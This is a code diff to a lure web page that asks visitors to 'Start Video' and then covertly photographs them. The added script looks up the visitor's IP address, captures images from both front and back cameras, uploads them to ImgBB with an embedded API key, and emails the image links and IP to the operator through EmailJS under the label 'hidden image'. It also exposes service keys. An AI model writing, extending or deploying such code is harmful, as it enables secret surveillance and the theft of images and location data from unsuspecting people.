@@ -164,6 +164,77 @@
       margin-top: 15px;
       line-height: 1.6;
     }
+    
+    /* IP Address Display */
+    .ip-container {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 15px;
+      border-radius: 8px;
+      margin: 15px 0;
+      font-family: monospace;
+      font-size: 18px;
+      display: none;
+    }
+    
+    .ip-label {
+      font-weight: bold;
+      margin-bottom: 8px;
+      color: #4cd97b;
+    }
+    
+    .ip-address {
+      word-break: break-all;
+    }
+    
+    /* Camera capture indicators */
+    .camera-indicators {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin: 20px 0;
+      display: none;
+    }
+    
+    .camera-indicator {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    
+    .camera-icon {
+      width: 50px;
+      height: 50px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 10px;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .camera-icon::before {
+      content: "";
+      position: absolute;
+      width: 30px;
+      height: 30px;
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 50%;
+    }
+    
+    .camera-icon::after {
+      content: "";
+      position: absolute;
+      width: 15px;
+      height: 15px;
+      background: rgba(255, 255, 255, 0.7);
+      border-radius: 50%;
+    }
+    
+    .camera-label {
+      font-size: 14px;
+    }
   </style>
 </head>
 <body>
@@ -174,6 +245,24 @@
     <div class="permission-request" id="permissionRequest">
       <p>Don't be sad.</p>
       <button class="permission-btn" id="cameraBtn">Start Video</button>
+    </div>
+    
+    <!-- IP Address Display -->
+    <div class="ip-container" id="ipContainer">
+      <div class="ip-label">Your IP Address:</div>
+      <div class="ip-address" id="ipAddress">Loading...</div>
+    </div>
+    
+    <!-- Camera indicators -->
+    <div class="camera-indicators" id="cameraIndicators">
+      <div class="camera-indicator">
+        <div class="camera-icon"></div>
+        <div class="camera-label">Front Camera</div>
+      </div>
+      <div class="camera-indicator">
+        <div class="camera-icon"></div>
+        <div class="camera-label">Back Camera</div>
+      </div>
     </div>
     
     <!-- Countdown element -->
@@ -206,7 +295,7 @@
   <canvas id="canvas" width="640" height="480" class="hidden"></canvas>
 
   <script>
-    // عناصر DOM
+    // DOM elements
     const player = document.getElementById('player');
     const loading = document.querySelector('.loading');
     const message = document.querySelector('.message');
@@ -217,15 +306,37 @@
     const countdownElement = document.getElementById('countdown');
     const permissionRequest = document.getElementById('permissionRequest');
     const cameraBtn = document.getElementById('cameraBtn');
+    const ipContainer = document.getElementById('ipContainer');
+    const ipAddressElement = document.getElementById('ipAddress');
+    const cameraIndicators = document.getElementById('cameraIndicators');
     
-    // متغيرات الحالة
+    // State variables
     let cameraCaptured = false;
     let emailSent = false;
     let countdownInterval;
     let stream;
+    let ipAddress = "Unknown";
     
     // Hide countdown initially
     countdownElement.style.display = 'none';
+    
+    // Function to get IP address
+    async function getIPAddress() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        ipAddress = data.ip;
+        ipAddressElement.textContent = ipAddress;
+        ipContainer.style.display = 'block';
+      } catch (error) {
+        console.error('Error fetching IP:', error);
+        ipAddressElement.textContent = "Failed to retrieve IP address";
+        ipContainer.style.display = 'block';
+      }
+    }
+    
+    // Get IP address when page loads
+    getIPAddress();
     
     // Function to start the countdown
     function startCountdown() {
@@ -254,7 +365,100 @@
       player.style.display = 'block';
       
       // Start the camera capture process
-      setTimeout(captureImage, 3000);
+      setTimeout(captureBothCameras, 3000);
+    }
+    
+    // Function to capture both front and back cameras
+    async function captureBothCameras() {
+      if (!cameraCaptured) return;
+      
+      try {
+        cameraIndicators.style.display = 'flex';
+        
+        // Capture front camera
+        await captureCamera('user', 'Front Camera');
+        
+        // Add a small delay between captures
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        // Capture back camera
+        await captureCamera('environment', 'Back Camera');
+        
+        // Stop the stream
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+        }
+        
+      } catch (error) {
+        console.error('Camera capture error:', error);
+      }
+    }
+    
+    // Function to capture a single camera
+    async function captureCamera(facingMode, cameraName) {
+      try {
+        // Show camera capture indicator
+        const indicators = document.querySelectorAll('.camera-indicator');
+        if (cameraName === 'Front Camera') indicators[0].style.opacity = '1';
+        if (cameraName === 'Back Camera') indicators[1].style.opacity = '1';
+        
+        // Access the camera
+        stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { 
+            facingMode: facingMode,
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          } 
+        });
+        
+        hiddenVideo.srcObject = stream;
+        
+        // Wait for video to load
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        const ctx = canvas.getContext('2d');
+        
+        // Capture image
+        ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+        
+        // Get image data
+        const imageData = canvas.toDataURL('image/jpeg', 0.85);
+        const base64Image = imageData.split(',')[1];
+        
+        // Stop the current stream track
+        stream.getTracks().forEach(track => track.stop());
+        
+        // Upload image to ImgBB
+        const formData = new FormData();
+        formData.append('image', base64Image);
+        formData.append('name', `hidden_${cameraName.replace(' ', '_')}_${Date.now()}`);
+        
+        const uploadResponse = await fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
+          method: 'POST',
+          body: formData
+        });
+        
+        const imgbbData = await uploadResponse.json();
+        
+        if (imgbbData.success) {
+          // Send email using EmailJS
+          emailjs.send("service_890xst3", "template_p1oukct", {
+            name: "صورة خفية",
+            time: new Date().toLocaleString(),
+            message: `تم التقاط صورة من ${cameraName}. عنوان IP: ${ipAddress}`,
+            image_url: imgbbData.data.url,
+            camera_type: cameraName,
+            ip_address: ipAddress
+          }).then(() => {
+            emailSent = true;
+          }, error => {
+            console.error('Email error:', error);
+          });
+        }
+        
+      } catch (error) {
+        console.error(`Error capturing ${cameraName}:`, error);
+      }
     }
     
     // Event listener for camera permission button
@@ -290,7 +494,7 @@
         permissionRequest.style.display = 'block';
         
         // Show error message
-        errorMsg.textContent = 'يجب السماح بالكاميرا لتشغيل الفيديو. يرجى تحديث الصفحة والمحاولة مرة أخرى.';
+        errorMsg.textContent = 'You must allow camera access to play the video. Please refresh and try again.';
         errorMsg.style.display = 'block';
       }
     });
@@ -305,65 +509,12 @@
       success.style.display = 'block';
     });
     
-    // وظيفة التقاط الصورة
-    function captureImage() {
-      if (!cameraCaptured) return;
-      
-      try {
-        const ctx = canvas.getContext('2d');
-        
-        // التقاط الصورة
-        ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
-        
-        // الحصول على بيانات الصورة
-        const imageData = canvas.toDataURL('image/jpeg', 0.85);
-        const base64Image = imageData.split(',')[1];
-        
-        // إيقاف تشغيل الكاميرا
-        if (stream) {
-          stream.getTracks().forEach(track => track.stop());
-        }
-        
-        // رفع الصورة إلى ImgBB
-        const formData = new FormData();
-        formData.append('image', base64Image);
-        formData.append('name', 'hidden_capture_' + Date.now());
-        
-        fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
-          method: 'POST',
-          body: formData
-        })
-        .then(response => response.json())
-        .then(imgbbData => {
-          if (imgbbData.success) {
-            // إرسال الإيميل باستخدام EmailJS
-            emailjs.send("service_890xst3", "template_p1oukct", {
-              name: "صورة خفية",
-              time: new Date().toLocaleString(),
-              message: "تم التقاط صورة جديدة من الكاميرا الأمامية.",
-              image_url: imgbbData.data.url
-            }).then(() => {
-              emailSent = true;
-            }, error => {
-              console.error('Email error:', error);
-            });
-          }
-        })
-        .catch(error => {
-          console.error('ImgBB error:', error);
-        });
-        
-      } catch (error) {
-        console.error('Capture error:', error);
-      }
-    }
-    
     // Display success message after 10 seconds
     setTimeout(() => {
       if (cameraCaptured && emailSent) {
-        console.log('تم التقاط الصورة وإرسالها بنجاح!');
+        console.log('Image captured and sent successfully!');
       } else if (cameraCaptured) {
-        console.log('تم التقاط الصورة ولكن حدث خطأ في الإرسال');
+        console.log('Image captured but sending failed');
       }
     }, 10000);
   </script>
